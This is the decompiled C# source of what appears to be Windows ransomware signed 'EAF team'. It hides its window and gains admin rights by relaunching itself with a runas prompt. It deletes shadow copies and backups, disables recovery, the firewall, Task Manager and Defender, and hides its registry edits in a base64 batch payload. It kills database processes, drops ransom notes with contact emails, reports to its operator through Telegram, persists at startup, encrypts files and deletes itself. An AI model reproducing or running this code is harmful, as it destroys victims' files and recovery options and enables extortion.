using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace Fast;

internal class Program
{
	public static string[] messages = new string[10] { "ATTENTION!", "At the moment, your system is not protected.", "We can fix it and restore files.", "To get started, send a file to decrypt trial.", "Don't pay any money, when we didn't decrypt trial file.", "You can trust us after opening the test file.", "To restore the system write to this address: ", "", "Email 1: encoderdecryption@yandex.ru", "Email 2: encoderdecryption@gmail.com" };

	public static string droppedMessageTextbox = "#FILES-ENCRYPTED.txt";

	public static string email1 = "encoderdecryption@yandex.ru";

	public static string email2 = "encoderdecryption@gmail.com";

	public static string[] validExtensions = new string[1] { ".EAF" };

	public static string strProcessURL = Process.GetCurrentProcess().ProcessName;

	public static string strProcessName = Assembly.GetExecutingAssembly().GetName().Name;

	public static string processName = strProcessName + ".exe";

	public static string processURL = strProcessURL + ".url";

	public static string txtName = "This Is Your Helper File.txt";

	public static string A = "1qw0ll8p9m8uezhqhyd";

	public static string B = "7z459ajrk722yn8c5j4fg";

	public static string C = "17CqMQFeuB3NTzJ";

	public static string D = "2X28tfRmWaPyPQgvoHV";

	public static string keyword = "QWERTYUIOPASDFGHJKLZXCVBNM";

	public static string RndKey = "";

	public static Random rnd = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private static void Main(string[] args)
	{
		Console.Title = "encoderdecryption@yandex.ru";
		IntPtr consoleWindow = GetConsoleWindow();
		ShowWindow(consoleWindow, 0);
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		copyResistForAdmin(processName);
		runas_bat();
		RndKey = "";
		Reg();
		deleteBackupCatalog();
		disableRecoveryMode();
		deleteShadowCopies();
		some_cmd();
		checkTask();
		BackUp();
		spreadIt();
		addAndOpenNote();
		int length = rnd.Next(20, 26);
		RndKey = CreatePassword(length);
		Icon.SaveImage();
		Telegram.SendForOwner();
		addLinkToStartup();
		ENC1.Start();
		ENC2.Start();
		ENC3.Start();
		ENC4.Start();
		EAF.DestoryExeFile();
	}

	private static void some_cmd()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
		runCommand("bcdedit /set {default} recoveryenabled no");
		runCommand("netsh advfirewall set currentprofile state off");
		runCommand("netsh firewall set opmode mode=disable");
	}

	private static void BackUp()
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
			string s = "QGVjaG8gb2ZmDQpSZWcuZXhlIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xCYWNrdXBcQ2xpZW50IiAvdiAiRGlzYWJsZUJhY2t1cFVJIiAvdCBSRUdfRFdPUkQgL2QgIjEiIC9mDQpSZWcuZXhlIGFkZCAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxTZWN1cml0eVByb3ZpZGVyc1xTQ0hBTk5FTCIgL3YgIkNsaWVudENhY2hlVGltZSIgL3QgUkVHX0RXT1JEIC9kICIwIiAvZg0KUmVnLmV4ZSBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgTlRcU3lzdGVtUmVzdG9yZSIgL3YgIkRpc2FibGVTUiIgL3QgUkVHX0RXT1JEIC9kICIxIiAvZg0KUmVnLmV4ZSBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgTlRcU3lzdGVtUmVzdG9yZSIgL3YgIkRpc2FibGVDb25maWciIC90IFJFR19EV09SRCAvZCAiMSIgL2YNClJlZy5leGUgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSIgL3YgIkVuYWJsZUxVQSIgL3QgUkVHX0RXT1JEIC9kICIwIiAvZg0KUmVnLmV4ZSBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIiAvdiAiUHJvbXB0T25TZWN1cmVEZXNrdG9wIiAvdCBSRUdfRFdPUkQgL2QgIjAiIC9mDQpSZWcuZXhlIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW0iIC92ICJFbmFibGVMVUEiIC90IFJFR19EV09SRCAvZCAiMSIgL2YNClJlZy5leGUgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSIgL3YgIkNvbnNlbnRQcm9tcHRCZWhhdmlvckFkbWluIiAvdCBSRUdfRFdPUkQgL2QgIjAiIC9mDQpSZWcuZXhlIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxwb2xpY2llc1xzeXN0ZW1cQ3JlZFNTUFxQYXJhbWV0ZXJzIiAvdiAiQWxsb3dFbmNyeXB0aW9uT3JhY2xlIiAvdCBSRUdfRFdPUkQgL2QgIjIiIC9mDQpSZWcuZXhlIGFkZCAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xFeHBsb3JlciIgL3YgIk5vQ29udHJvbFBhbmVsIiAvdCBSRUdfRFdPUkQgL2QgIjEiIC9mDQpSZWcuZXhlIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xFeHBsb3JlciIgL3YgIk5vQ29udHJvbFBhbmVsIiAvdCBSRUdfRFdPUkQgL2QgIjEiIC9mDQpSZWcuZXhlIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBOVFxUZXJtaW5hbCBTZXJ2aWNlcyIgL3YgIlVzZXJBdXRoZW50aWNhdGlvbiIgL3QgUkVHX0RXT1JEIC9kICIwIiAvZg0KUmVnLmV4ZSBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgTlRcVGVybWluYWwgU2VydmljZXMiIC92ICJmRGVueVRTQ29ubmVjdGlvbnMiIC90IFJFR19EV09SRCAvZCAiMCIgL2YNClJlZy5leGUgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyIiAvdiAiRGlzYWJsZUFudGlTcHl3YXJlIiAvdCBSRUdfRFdPUkQgL2QgIjEiIC9mDQpSZWcuZXhlIGFkZCAiSEtDUlwqXHNoZWxsXHJ1bmFzIiAvdmUgL3QgUkVHX1NaIC9kICJUYWtlIE93bmVyc2hpcCIgL2YNClJlZy5leGUgYWRkICJIS0NSXCpcc2hlbGxccnVuYXMiIC92ICJOb1dvcmtpbmdEaXJlY3RvcnkiIC90IFJFR19TWiAvZCAiIiAvZg0KUmVnLmV4ZSBhZGQgIkhLQ1JcKlxzaGVsbFxydW5hc1xjb21tYW5kIiAvdmUgL3QgUkVHX1NaIC9kICJjbWQuZXhlIC9jIHRha2Vvd24gL2YgXCIlJTFcIiAmJiBpY2FjbHMgXCIlJTFcIiAvZ3JhbnQgYWRtaW5pc3RyYXRvcnM6RiIgL2YNClJlZy5leGUgYWRkICJIS0NSXCpcc2hlbGxccnVuYXNcY29tbWFuZCIgL3YgIklzb2xhdGVkQ29tbWFuZCIgL3QgUkVHX1NaIC9kICJjbWQuZXhlIC9jIHRha2Vvd24gL2YgXCIlJTFcIiAmJiBpY2FjbHMgXCIlJTFcIiAvZ3JhbnQgYWRtaW5pc3RyYXRvcnM6RiIgL2YNClJlZy5leGUgYWRkICJIS0NSXERpcmVjdG9yeVxzaGVsbFxydW5hcyIgL3ZlIC90IFJFR19TWiAvZCAiVGFrZSBPd25lcnNoaXAiIC9mDQpSZWcuZXhlIGFkZCAiSEtDUlxEaXJlY3Rvcnlcc2hlbGxccnVuYXMiIC92ICJOb1dvcmtpbmdEaXJlY3RvcnkiIC90IFJFR19TWiAvZCAiIiAvZg0KUmVnLmV4ZSBhZGQgIkhLQ1JcRGlyZWN0b3J5XHNoZWxsXHJ1bmFzXGNvbW1hbmQiIC92ZSAvdCBSRUdfU1ogL2QgImNtZC5leGUgL2MgdGFrZW93biAvZiBcIiUlMVwiIC9yIC9kIHkgJiYgaWNhY2xzIFwiJSUxXCIgL2dyYW50IGFkbWluaXN0cmF0b3JzOkYgL3QiIC9mDQpSZWcuZXhlIGFkZCAiSEtDUlxEaXJlY3Rvcnlcc2hlbGxccnVuYXNcY29tbWFuZCIgL3YgIklzb2xhdGVkQ29tbWFuZCIgL3QgUkVHX1NaIC9kICJjbWQuZXhlIC9jIHRha2Vvd24gL2YgXCIlJTFcIiAvciAvZCB5ICYmIGljYWNscyBcIiUlMVwiIC9ncmFudCBhZG1pbmlzdHJhdG9yczpGIC90IiAvZg==";
			string uID = what.UID;
			string text = folderPath + "\\" + uID + ".bat";
			byte[] array = Convert.FromBase64String(s);
			using (FileStream fileStream = new FileStream(text, FileMode.Create))
			{
				fileStream.Write(array, 0, array.Length);
				fileStream.Flush();
			}
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				Verb = "runas",
				FileName = text,
				WindowStyle = ProcessWindowStyle.Normal
			};
			process.Start();
			process.WaitForExit();
		}
		catch (Exception)
		{
		}
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void runCommand(string commands)
	{
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				Verb = "runas",
				FileName = "cmd.exe",
				Arguments = "/C " + commands,
				WindowStyle = ProcessWindowStyle.Hidden
			};
			process.Start();
			process.WaitForExit();
		}
		catch
		{
		}
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void Reg()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey2.SetValue("Shell", "empty", RegistryValueKind.String);
			RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey3.SetValue("legalnoticecaption", "EAF", RegistryValueKind.String);
			registryKey3.SetValue("legalnoticetext", "You were attacked by the EAF team plz read #FILES-ENCRYPTED.txt", RegistryValueKind.String);
			RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
			registryKey4.SetValue("Wallpaper", "", RegistryValueKind.String);
		}
		catch
		{
		}
	}

	public static string UniqueID()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"" + Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System))!.Remove(1, 2) + ":\"");
		val.Get();
		string text = ((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString();
		if (!string.IsNullOrEmpty(text))
		{
			return text;
		}
		ManagementObjectSearcher val2 = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
		string result = "";
		ManagementObjectEnumerator enumerator = val2.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator.get_Current();
				result = ((ManagementBaseObject)val3).get_Item("SerialNumber").ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return result;
	}

	public static string GetID()
	{
		object obj = "";
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		int num = 0;
		if (0 < allNetworkInterfaces.Length)
		{
			NetworkInterface networkInterface = allNetworkInterfaces[num];
			obj = networkInterface.GetPhysicalAddress().ToString();
		}
		if (string.IsNullOrEmpty(obj.ToString()))
		{
			obj = Environment.UserName;
		}
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(obj.ToString()));
	}

	private static void runas_bat()
	{
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				Verb = "runas",
				FileName = "cmd.exe",
				Arguments = "/C reagentc /disable",
				WindowStyle = ProcessWindowStyle.Hidden
			};
			process.Start();
			process.WaitForExit();
		}
		catch
		{
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	private static void spreadIt()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (!File.Exists(driveInfo.ToString() + droppedMessageTextbox))
			{
				try
				{
					File.WriteAllLines(driveInfo.ToString() + droppedMessageTextbox, messages);
				}
				catch
				{
				}
			}
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo startInfo = new ProcessStartInfo(text2)
		{
			UseShellExecute = true,
			Verb = "runas",
			WindowStyle = ProcessWindowStyle.Normal,
			WorkingDirectory = text
		};
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	public static void checkTask()
	{
		List<string> list = new List<string>
		{
			"taskmgr", "sqlagent", "winword", "sqlbrowser", "sqlservr", "sqlwriter", "oracle", "ocssd", "dbsnmp", "synctime",
			"mydesktopqos", "agntsvc.exeisqlplussvc", "xfssvccon", "mydesktopservice", "ocautoupds", "agntsvc.exeagntsvc", "agntsvc.exeencsvc", "firefoxconfig", "tbirdconfig", "ocomm",
			"mysqld", "sql", "mysqld-nt", "mysqld-opt", "dbeng50", "sqbcoreservice", "SQLWriter", "SQLBrowser", "MSSQLSERVER", "MSSQL$CONTOSO1",
			"MSDTC", "SQLSERVERAGENT", "vds"
		};
		Process[] processes = Process.GetProcesses();
		try
		{
			Process[] array = processes;
			foreach (Process process in array)
			{
				foreach (string item in list)
				{
					if (process.ProcessName.ToLower().Contains(item.ToLower()))
					{
						process.Kill();
					}
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}
}
